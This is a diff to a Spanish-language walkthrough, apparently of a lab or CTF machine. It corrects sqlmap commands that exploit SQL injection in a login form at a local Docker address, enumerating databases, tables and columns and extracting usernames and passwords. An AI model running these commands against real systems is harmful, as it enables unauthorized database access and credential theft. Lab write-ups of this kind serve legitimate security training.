@@ -19,7 +19,7 @@ Efectivamente este panel de login es vulnerable a inyecciones Sql, entonces me a
 
 1. Enumero posibles bases de datos
 ```
-sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) --dbs --batch --forms
+sqlmap --url http://172.17.0.2/index.php --dbs --batch --forms
 ```
 
 ![](../../../Images/Pasted%20image%2020240813093627.png)
@@ -30,7 +30,7 @@ Usaré la base de datos "Users"
 
 2. Enumero posibles tablas, de esta base de datos:
 ```
-sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users --batch --forms
+sqlmap --url http://172.17.0.2/index.php -D users --tables --batch --forms
 ```
 
 ![](../../../Images/Pasted%20image%2020240813093813.png)
@@ -41,7 +41,7 @@ Obtengo la tabla llamada "Usuarios"
 
 3. Enumeré posibles columnas de esta tabla:
 ```
-sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users -T usuarios --columns --batch --forms
+sqlmap --url http://172.17.0.2/index.php -D users -T usuarios --columns --batch --forms
 ```
 
 ![](../../../Images/Pasted%20image%2020240813093851.png)
@@ -52,7 +52,7 @@ Tengo 3 columnas "id", "password" y "username"
 
 4. Y por último, enumeraré usuarios de estas 3 columnas:
 ```
-sqlmap --url [http://172.17.0.2/index.php](http://172.17.0.2/index.php) -D users -T usuarios -C id,password,username --batch --forms
+sqlmap --url http://172.17.0.2/index.php -D users -T usuarios -C id,password,username --batch --forms
 ```
 
 ![](../../../Images/Pasted%20image%2020240813093942.png)
